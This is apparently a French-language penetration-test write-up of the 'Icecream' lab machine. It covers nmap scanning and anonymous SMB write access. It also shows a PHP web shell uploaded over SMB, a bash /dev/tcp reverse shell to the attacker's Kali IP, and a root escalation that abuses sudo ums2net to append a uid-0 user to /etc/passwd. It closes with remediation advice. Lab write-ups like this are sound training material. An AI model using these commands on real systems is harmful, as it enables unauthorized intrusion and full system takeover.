# 📌 Rapport de Vulnérabilité : Icecream
## 📖 Sommaire  
1. [📝 Introduction](#1-introduction)  
2. [🔍 Découverte et Analyse Initiale des Services](#2-d%C3%A9couverte-et-analyse-initiale-des-services)  
   - [📡 Scan Nmap](#21-scan-nmap)  
   - [🛠 Analyse des services ouverts](#22-analyse-des-services-ouverts)  
3. [🚀 Potentielles Pistes d'Exploitation](#3-potentielles-pistes-dexploitation)  
   - [🔓 Exploitation des Ports SMB](#31-exploitation-des-ports-smb)  
4. [🎯 Exploitation et Accès à la Machine](#-4-exploitation-et-accès-à-la-machine)  
   - [🖥️ Mise en place d'un Web Shell](#41-mise-en-place-dun-web-shell)  
5. [⚡ Élévation de Privilèges](#5-élévation-de-privilèges)  
   - [📊 Analyse avec Linpeas](#51-analyse-avec-linpeas)  
   - [🔑 Utilisation de ums2net pour l'élévation de privilèges](#-53-utilisation-de-ums2net-pour-lélévation-de-privilèges)  
   - [📌 Exploitation via ums2net](#-53-exploitation-via-ums2net)  
6. [🛡️ Recommandations de Sécurité](#6-recommandations-de-sécurité-pour-corriger-la-vulnérabilité-ums2net)  
7. [🔚 Conclusion](#-7-conclusion)  

---

## 1. Introduction

### Objectif  
Identifier et exploiter les failles de sécurité de la machine cible **"Icecream"**.

### Informations sur les IP  
**IP Cible :** 192.168.188.214  
**IP Kali :** 192.168.188.128  


### 🖼️ Schéma de l’Infrastructure
Un aperçu de l’infrastructure actuelle est illustré ci-dessous :

![image](https://github.com/user-attachments/assets/a45d8c10-5f00-4661-b4be-307b155ae1dd)

---

Après avoir installé **Icecream** et testé la communication entre les machines, nous pouvons commencer le pentest.

![image6](https://github.com/user-attachments/assets/9ace5f64-811d-46d2-91d4-72febc164dd2)

## 2. Découverte et Analyse Initiale des Services

### 2.1. Scan Nmap

#### Commandes exécutées :  
Définition de la variable IP cible et exécution d’un scan complet des ports, suivi d’un scan approfondi (`-sVC`) pour détecter les services et versions.

```bash
target=192.168.188.214  
nmap -T4 -p$(nmap -Pn -T4 -n -p- $target | grep 'tcp.*open' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -Pn -n -sVC $target
```
![image22](https://github.com/user-attachments/assets/e734ee50-4961-4aca-9e03-bc7c6898ce2c)
![image17](https://github.com/user-attachments/assets/503917ee-c35a-4a19-8e35-8cdc01de8788)


### 2.2. Analyse des services ouverts  

| Port  | Service      | Version / Info                 |
|-------|------------|--------------------------------|
| 22    | SSH        | OpenSSH 9.2p1 (Debian 12)      |
| 90    | HTTP       | Nginx 1.22.1 (403 Forbidden)   |
| 139   | SMB        | Samba 4.6.2 (NetBIOS)          |
| 445   | SMB        | Samba 4.6.2                    |
| 9000  | HTTP       | Nginx Unity 1.33.0 (Unit Server) |

## 3. Potentielles Pistes d'Exploitation

### 3.1. Exploitation des Ports SMB  
Analyse des vulnérabilités potentielles des ports **139** & **445** (Samba 4.6.2).  
Après consultation de **SearchSploit** et **CVE Details**, aucune faille exploitable récente n'a été identifiée.

![image10](https://github.com/user-attachments/assets/42d9558e-304b-4ecb-b066-57725a8cab04)

#### Tests de connexion SMB  
Utilisation de `smbclient` pour tester l'accès aux partages.

```bash
smbclient -L //192.168.188.214 -N  
```

![image16](https://github.com/user-attachments/assets/c8d78cbc-5a76-46fb-83a8-afb3c3c30e1d)

Connexion au partage **"icecream"** :  

```bash
smbclient //192.168.188.214/icecream -N  
```

![image9](https://github.com/user-attachments/assets/f50dd2e9-d504-4395-a02a-986c214d73b1)
![image1](https://github.com/user-attachments/assets/b5c39a4a-6de5-40d2-bf67-71b3fcb81223)

📌 **Constat :**
✅ Accès en écriture confirmé.  

## 4. Exploitation et Accès à la Machine

### 4.1. Mise en place d'un Web Shell  
Création et envoi d’un **Web Shell** pour exécuter des commandes à distance.

```bash
echo "<?php system(\$_GET['cmd']); ?>" > shell.php  
```

Envoi du Web Shell via **SMB** :  

```bash
smbclient //192.168.188.214/icecream -N  
put shell.php  
```

![image11](https://github.com/user-attachments/assets/1ed001af-bbb4-42bd-98da-bea0c9d9d268)

Exécution de commandes :  

```bash
curl "http://192.168.188.214/shell.php?cmd=id"  
```

![image25](https://github.com/user-attachments/assets/776c46b5-38c4-449b-87dd-4eba64c88dbf)

Nous devons maintenant démarrer **Netcat** et attendre que la cible nous envoie une connexion.

![image26](https://github.com/user-attachments/assets/73f39262-64fe-48bb-9893-cedda1799338)

Ensuite, nous retournons sur la cible et exécutons la commande suivante :

![image24](https://github.com/user-attachments/assets/408ac94e-5ca4-4b4e-b3d2-523f2ed20d7f)

Ce qui nous permettra d'établir une connexion :

![image15](https://github.com/user-attachments/assets/1547e4f5-ec92-4054-9588-024d8e1f4fd2)

Nous passons maintenant en **shell interactif** à l’aide de la commande :

![image13](https://github.com/user-attachments/assets/08a0f85a-f8db-4fa4-8603-dce39ef70004)
![image20](https://github.com/user-attachments/assets/ec2caedc-964e-4160-bdb8-f7f4a2cc8a99)

### 🔎 Identification des failles avec **Linpeas**  
Nous allons tester les identifiants en utilisant **Linpeas**, un script qui analyse automatiquement le système pour détecter des vulnérabilités d’élévation de privilèges.  

📌 **Linpeas** permet de trouver :  
Des fichiers avec des permissions spéciales  
Des mots de passe cachés  
Des tâches cron vulnérables  
Des services mal configurés pouvant mener à une escalade de privilèges

C’est un outil très efficace pour automatiser la **découverte de vulnérabilités** après l’obtention d’un premier accès sur une machine Linux.  

---

### 📥 Installation de Linpeas  
Nous pouvons récupérer l’outil avec la commande suivante :

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```
Il suffira juste des les envoyer sur la machine cible en smb :

![image18](https://github.com/user-attachments/assets/c9542e96-f43a-40b5-9238-12d4682e7c59)

## 5. Élévation de Privilèges

### 5.1. Analyse avec Linpeas
Téléchargement et exécution de **Linpeas** pour identifier des vulnérabilités d’élévation de privilèges.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh  
```

![image4](https://github.com/user-attachments/assets/c4f344e6-44df-449c-a698-e45703bea8ff)
![image27](https://github.com/user-attachments/assets/0d0bce59-3dc3-4ed8-a216-92aac0194b0e)

### 5.2. Exploitation de CVE-2021-3156  
Tentative d’exploitation de **CVE-2021-3156 (sudo heap overflow)** pour obtenir un shell root.  
❌ **Échec :** La version du système ne permet pas l’exploitation de cette faille.

![image2](https://github.com/user-attachments/assets/0a7142a3-6757-4040-b7ed-4a8da0eb4025)

### 🔑 5.3. Utilisation de ums2net pour l'élévation de privilèges  
Nous avons créé une **nouvelle configuration** pour `ums2net` qui redirige les entrées/sorties vers `/etc/passwd`.  

![image3](https://github.com/user-attachments/assets/9dd238a9-4a5f-4786-af8c-5ee2070216fb)
![image7](https://github.com/user-attachments/assets/a2ece629-6572-489a-9bb6-a8975d71e1cf)
![image23](https://github.com/user-attachments/assets/14e29689-12c6-4b94-ad2a-3f981a7cc3a1)

On peut constater qu'il a bien était modifié :

![image8](https://github.com/user-attachments/assets/ff5a65b0-a177-409e-a2d2-3694ccc6d7bc)

On peut bien exécuter bien des commandes sur la machine cible :

![image21](https://github.com/user-attachments/assets/e3582859-8fa2-40bf-a03a-a15324c71a66)

```bash
echo '5000 of=/etc/passwd bs=4096' > /tmp/config
scp /tmp/config user@192.168.188.214:/tmp/
```
![image12](https://github.com/user-attachments/assets/5fea9bec-9da2-4d45-9fd5-3af7f592c215)

Sur la machine cible, nous exécutons :  

```bash
sudo /usr/sbin/ums2net -c /tmp/config -d
```

**Connexion avec Netcat** pour interagir avec le shell :  

```bash
nc -lvnp 7777
curl "http://192.168.188.214:8080/?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.188.128/7777%200>%261'"
```

![image5](https://github.com/user-attachments/assets/ffaa58c5-ad24-4938-a740-ecf05c40652d)
![image14](https://github.com/user-attachments/assets/daae84d5-5a6a-48da-8ac9-dfd8ecf71877)
![image19](https://github.com/user-attachments/assets/0e5dabf4-ff0a-48e1-852a-9b4a625d256f)


✅ **Accès utilisateur obtenu sur la machine cible !**  

---

### 📌 5.3. Exploitation via ums2net  

Modification de `/etc/passwd` pour ajouter un utilisateur root.  

#### Modification de `/etc/passwd`  
```bash
echo 'aurelien:$6$IPVFVjVKK55o19kF$XqJHT3H5Qcmk96/iaLUfcC3UQPEYF0yFGzRtTinb/9NfQZIpWed9UfA6YBaEWhE5TRc1MLaXgLHWUtYI010Pj1:0:0:aurelien:/home/aurelien:/bin/bash' >> passwd  
nc -v 192.168.188.214 5000 < ./passwd  
sudo /usr/sbin/ums2net -c /tmp/config -d  
```


✅ **Accès root obtenu** via l’utilisateur **"aurelien"**.

##🛡️ 6. Recommandations de Sécurité pour Corriger la Vulnérabilité ums2net

### 6.1. Révision des Permissions de Sudo  
Modifier le fichier `/etc/sudoers` pour supprimer **NOPASSWD** des commandes sensibles.

### 6.2. Sécurisation des Fichiers de Configuration  
- Restreindre les permissions de `/etc/passwd` :  
```bash
  chmod 644 /etc/passwd  
```
Empêcher **ums2net** d’être exécuté en tant que root.

### 6.3. Mise à Jour et Patch du Système  
Désinstaller ou mettre à jour **ums2net**.  
Vérifier les services SMB et SSH pour éviter les accès non autorisés.

## 🔚 7. Conclusion
Nous avons réussi à accéder au partage SMB et identifier des fichiers exploitables.  
Déployer un Web Shell pour obtenir un accès shell distant.  
Élever nos privilèges à root en exploitant **ums2net**.

📌 **Actions correctives impératives** :  
Désactiver ou patcher ums2net.  
Appliquer des restrictions sur SMB et SSH.  
Surveiller les logs système pour détecter toute activité suspecte.
